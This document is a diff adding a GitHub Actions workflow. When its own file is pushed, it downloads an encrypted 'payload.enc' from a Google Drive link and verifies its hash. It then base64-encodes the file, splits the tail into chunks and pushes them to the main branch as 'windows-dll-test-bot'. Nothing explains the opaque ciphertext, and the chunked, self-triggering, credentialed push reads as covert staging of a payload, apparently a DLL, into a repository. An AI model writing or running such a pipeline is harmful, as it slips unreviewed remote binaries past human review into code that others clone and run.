@@ -1,0 +1,60 @@
+name: hydrate-exact-gate-v5-tail
+
+on:
+  push:
+    paths:
+      - '.github/workflows/hydrate_exact_gate_v5_tail.yml'
+
+permissions:
+  contents: write
+
+defaults:
+  run:
+    shell: bash
+
+jobs:
+  hydrate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          persist-credentials: true
+      - name: Fetch and verify ciphertext only
+        run: |
+          set -euo pipefail
+          url='https://drive.google.com/uc?export=download&id=1GXl1ymTiPGqiI87aQrREL5TIzz6mahuf'
+          curl -L --fail --retry 3 --retry-delay 2 -o "$RUNNER_TEMP/payload.enc" "$url"
+          bytes=$(wc -c < "$RUNNER_TEMP/payload.enc" | tr -d '[:space:]')
+          sha=$(sha256sum "$RUNNER_TEMP/payload.enc" | awk '{print $1}')
+          echo "CIPHERTEXT_BYTES=$bytes"
+          echo "CIPHERTEXT_SHA=$sha"
+          [ "$bytes" = 195056 ]
+          [ "$sha" = d285e1c1f058b67e69a14ffa2619d0afd525febf981c97bdac4ec6c062bc920c ]
+          base64 -w0 "$RUNNER_TEMP/payload.enc" > "$RUNNER_TEMP/payload.enc.b64"
+          [ "$(wc -c < "$RUNNER_TEMP/payload.enc.b64" | tr -d '[:space:]')" = 260076 ]
+      - name: Publish exact ciphertext tail chunks
+        run: |
+          set -euo pipefail
+          git config user.name "windows-dll-test-bot"
+          git config user.email "windows-dll-test-bot@users.noreply.github.com"
+          ok=0
+          for n in 1 2 3 4 5; do
+            git fetch origin main
+            git checkout -B main origin/main
+            mkdir -p .exact_gate_v5_payload
+            for i in 14 15 16 17 18 19 20; do
+              off=$((10#$i * 12000))
+              dd if="$RUNNER_TEMP/payload.enc.b64" of=".exact_gate_v5_payload/chunk_$i" bs=1 skip="$off" count=12000 status=none
+            done
+            dd if="$RUNNER_TEMP/payload.enc.b64" of=.exact_gate_v5_payload/chunk_21 bs=1 skip=252000 count=8076 status=none
+            [ "$(wc -c < .exact_gate_v5_payload/chunk_14)" = 12000 ]
+            [ "$(wc -c < .exact_gate_v5_payload/chunk_20)" = 12000 ]
+            [ "$(wc -c < .exact_gate_v5_payload/chunk_21)" = 8076 ]
+            git add .exact_gate_v5_payload/chunk_14 .exact_gate_v5_payload/chunk_15 .exact_gate_v5_payload/chunk_16 .exact_gate_v5_payload/chunk_17 .exact_gate_v5_payload/chunk_18 .exact_gate_v5_payload/chunk_19 .exact_gate_v5_payload/chunk_20 .exact_gate_v5_payload/chunk_21
+            git commit -m "Hydrate exact gate v5 ciphertext tail from verified source" || true
+            if git push origin HEAD:main; then ok=1; break; fi
+            sleep 2
+          done
+          [ "$ok" = 1 ]
+          echo V5_CIPHERTEXT_TAIL_PUBLISHED
